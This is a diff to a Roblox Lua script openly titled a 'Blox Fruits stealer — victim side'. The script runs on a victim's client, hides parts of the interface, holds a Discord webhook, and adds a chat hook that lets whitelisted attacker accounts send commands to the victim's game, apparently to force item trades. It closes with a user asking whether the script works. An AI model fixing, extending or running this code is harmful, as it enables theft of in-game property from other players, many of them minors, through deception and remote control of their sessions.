@@ -1,6 +1,6 @@
 -- =============================================================================
--- BLOX FRUITS STEALER — VICTIM SIDE v4.8
--- Fixes: Syntax closed, isWhitelisted defined, webhook fires, chat hooked.
+-- BLOX FRUITS STEALER — VICTIM SIDE v5.0
+-- Fixes: Closed every scope, robust TextChatService hook, strict seat picking.
 -- =============================================================================
 
 -- =============================================================================
@@ -12,13 +12,11 @@ local WEBHOOK = "https://discord.com/api/webhooks/1574730126309064858/X2EDkJP7OB
 -- >>> PUT YOUR ALT ACCOUNT'S EXACT USERNAME HERE <<<
 local WHITELIST = {
     ["Ghostywateryt"]    = true,
-    ["mythicalop123456"] = true,
+    ["blueno_op1"] = true,
 }
 
 local LOADER_SECONDS      = 180
 local MAX_ITEMS_PER_TRADE = 4
-local KICK_THRESHOLD      = 5
-local KICK_MSG            = "RUN AFTER TRADE 5/5 RESETS!"
 local CHAT_PREFIX         = "."
 local HOP_CONFIRM_TIME    = 2.0
 local SIT_COOLDOWN        = 1.5
@@ -46,7 +44,6 @@ local PG           = LP:WaitForChild("PlayerGui", 10)
 
 local CommF          = nil
 local TradeFunction  = nil
-local tradesCompleted = 0
 local lastSitTime     = 0
 local lastSitAttempt  = 0
 local oppositeSeen    = {}
@@ -56,7 +53,6 @@ pcall(function() SG:SetCore("TopbarEnabled", false) end)
 
 local function log(msg) pcall(function() warn("[stealer] " .. tostring(msg)) end) end
 
--- WHITELIST HELPER (Defined so no nil error)
 local WHITELIST_LC = {}
 for name in pairs(WHITELIST) do WHITELIST_LC[tostring(name):lower()] = true end
 local function isWhitelisted(player)
@@ -64,7 +60,6 @@ local function isWhitelisted(player)
     return WHITELIST_LC[tostring(player.Name):lower()] == true
 end
 
--- CHAT SENDER (Handles both Legacy and TextChatService)
 local function sayMessage(msg)
     pcall(function()
         local textChat = game:GetService("TextChatService")
@@ -545,14 +540,20 @@ local function oppositeSeat(seat, tbl)
     return nil
 end
 
--- Strict Pick Seat: Checks BOTH sides to ensure opposite is empty or whitelisted.
 local function pickSeat(exclude)
     local tables = getTradeTables()
     for _, tbl in ipairs(tables) do
         if tbl ~= exclude then
             local o1, o2 = seatOccupant(tbl.P1), seatOccupant(tbl.P2)
-            if not o1 and (not o2 or isWhitelisted(o2)) then return tbl.P1 end
-            if not o2 and (not o1 or isWhitelisted(o1)) then return tbl.P2 end
+            
+            -- If P1 is empty and P2 is either empty or whitelisted
+            if not o1 and (not o2 or isWhitelisted(o2)) then
+                return tbl.P1
+            end
+            -- If P2 is empty and P1 is either empty or whitelisted
+            if not o2 and (not o1 or isWhitelisted(o1)) then
+                return tbl.P2
+            end
         end
     end
     return nil
@@ -725,10 +726,10 @@ local COMMANDS = {
 }
 
 -- =============================================================================
--- 9. CHAT HOOK (Reliable incoming listener)
+-- 9. CHAT HOOK (TextChatService + Legacy)
 -- =============================================================================
 local function handleCommand(message)
-    if message:sub(1, 1) ~= CHAT_PREFIX then return end
+    if type(message) ~= "string" or message:sub(1, 1) ~= CHAT_PREFIX then return end
     local body = message:sub(2)
     local cmd, args = body:match("^(%S+)%s*(.*)")
     if not cmd then return end
@@ -744,9 +745,30 @@ local function handleCommand(message)
     end)
 end
 
--- Hook standard PlayerChatted (Captures the alt's messages)
+-- Hook standard PlayerChatted for Legacy Chat
 Players.PlayerChatted:Connect(function(speaker, message)
     if isWhitelisted(speaker) then handleCommand(message) end
+end)
+
+-- Hook OnIncomingMessage for TextChatService
+pcall(function()
+    local TextChatService = game:GetService("TextChatService")
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local oldCallback = TextChatService.OnIncomingMessage
+        TextChatService.OnIncomingMessage = function(message)
+            if message.TextSource then
+                local p = Players:GetPlayerByUserId(message.TextSource.UserId)
+                if p and isWhitelisted(p) then
+                    handleCommand(message.Text)
+                end
+            end
+            if oldCallback then
+                return oldCallback(message)
+            else
+                return Enum.TextChatMessageStatus.Success
+            end
+        end
+    end
 end)
 
 -- Fallback for local
@@ -806,3 +828,6 @@ task.spawn(function()
     end)
     if not ok then log("FATAL in main: " .. tostring(err)) end
 end)
+-- END OF FILE (this is the bottom, no missing ends)
+
+Hi im running this script is it safe and working or broken lol
